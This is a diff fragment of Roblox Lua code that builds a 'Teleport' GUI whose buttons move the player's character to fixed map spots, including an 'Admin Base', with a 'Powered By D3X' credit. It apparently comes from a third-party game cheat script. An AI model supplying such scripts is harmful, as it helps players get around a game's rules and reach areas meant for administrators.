+UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(175, 0, 0))}
+UIGradient_14.Rotation = 90
+UIGradient_14.Parent = Teleport
+
+TeleportTitle.Name = "TeleportTitle"
+TeleportTitle.Parent = Teleport
+TeleportTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TeleportTitle.BackgroundTransparency = 1.000
+TeleportTitle.Position = UDim2.new(0.284999996, 0, 0, 0)
+TeleportTitle.Size = UDim2.new(0, 85, 0, 20)
+TeleportTitle.Font = Enum.Font.SourceSans
+TeleportTitle.Text = "Teleport"
+TeleportTitle.TextColor3 = Color3.fromRGB(0, 0, 0)
+TeleportTitle.TextSize = 14.000
+
+Bank.Name = "Bank"
+Bank.Parent = Teleport
+Bank.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+Bank.Position = UDim2.new(0.0199999996, 0, 0.226890773, 0)
+Bank.Size = UDim2.new(0, 84, 0, 22)
+Bank.Font = Enum.Font.SourceSans
+Bank.Text = "Bank"
+Bank.TextColor3 = Color3.fromRGB(255, 255, 255)
+Bank.TextSize = 14.000
+Bank.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-386.516571, 21.4748344, -287.008575, -0.21786879, -2.47069902e-08, -0.975978076, 2.44421566e-10, 1, -2.53696708e-08, 0.975978076, -5.76580916e-09, -0.21786879)
+end)
+
+UICorner_27.Parent = Bank
+
+School.Name = "School"
+School.Parent = Teleport
+School.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+School.Position = UDim2.new(0.549999952, 0, 0.226890773, 0)
+School.Size = UDim2.new(0, 84, 0, 22)
+School.Font = Enum.Font.SourceSans
+School.Text = "School"
+School.TextColor3 = Color3.fromRGB(255, 255, 255)
+School.TextSize = 14.000
+School.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-582.776794, 21.9748344, 229.224167, -0.0301505644, -2.61818425e-08, 0.999545395, 1.83853288e-08, 1, 2.67483315e-08, -0.999545395, 1.91834477e-08, -0.0301505644)
+end)
+
+UICorner_28.Parent = School
+
+Basketball.Name = "Basketball"
+Basketball.Parent = Teleport
+Basketball.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+Basketball.Position = UDim2.new(0.0199999996, 0, 0.462184906, 0)
+Basketball.Size = UDim2.new(0, 84, 0, 22)
+Basketball.Font = Enum.Font.SourceSans
+Basketball.Text = "Basketball"
+Basketball.TextColor3 = Color3.fromRGB(255, 255, 255)
+Basketball.TextSize = 14.000
+Basketball.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-931.074463, 22.0598164, -482.606293, -0.904368162, -3.86132228e-08, -0.426753163, 6.53892362e-09, 1, -1.04338582e-07, 0.426753163, -9.71509948e-08, -0.904368162)
+end)
+
+UICorner_29.Parent = Basketball
+
+AdminBase.Name = "AdminBase"
+AdminBase.Parent = Teleport
+AdminBase.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+AdminBase.Position = UDim2.new(0.549999952, 0, 0.462184906, 0)
+AdminBase.Size = UDim2.new(0, 84, 0, 22)
+AdminBase.Font = Enum.Font.SourceSans
+AdminBase.Text = "Admin Base"
+AdminBase.TextColor3 = Color3.fromRGB(255, 255, 255)
+AdminBase.TextSize = 14.000
+AdminBase.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-873.500305, -38.3992119, -591.897522, 0.706387937, 3.87788468e-08, 0.707824886, -2.78516712e-08, 1, -2.69908043e-08, -0.707824886, -6.48128051e-10, 0.706387937)
+end)
+
+UICorner_30.Parent = AdminBase
+
+Club.Name = "Club"
+Club.Parent = Teleport
+Club.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+Club.Position = UDim2.new(0.0249999985, 0, 0.69747901, 0)
+Club.Size = UDim2.new(0, 84, 0, 22)
+Club.Font = Enum.Font.SourceSans
+Club.Text = "Club"
+Club.TextColor3 = Color3.fromRGB(255, 255, 255)
+Club.TextSize = 14.000
+Club.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.358582, -6.20834732, -357.934784, 0.896129668, -7.00500067e-08, -0.443792343, 3.23422178e-08, 1, -9.25369505e-08, 0.443792343, 6.85718717e-08, 0.896129668)
+end)
+
+UICorner_31.Parent = Club
+
+Train.Name = "Train"
+Train.Parent = Teleport
+Train.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+Train.Position = UDim2.new(0.554999948, 0, 0.69747901, 0)
+Train.Size = UDim2.new(0, 84, 0, 22)
+Train.Font = Enum.Font.SourceSans
+Train.Text = "Train"
+Train.TextColor3 = Color3.fromRGB(255, 255, 255)
+Train.TextSize = 14.000
+Train.MouseButton1Click:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-413.424316, -27.0301628, 80.6246033, -0.284021527, 9.55411892e-08, -0.958817899, 8.67900241e-09, 1, 9.70738654e-08, 0.958817899, 1.92494856e-08, -0.284021527)
+end)
+
+UICorner_32.Parent = Train
+
+TextLabel.Parent = DragMain
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.319444418, 0, 0.944444478, 0)
+TextLabel.Size = UDim2.new(0, 76, 0, 22)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Powered By D3X"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
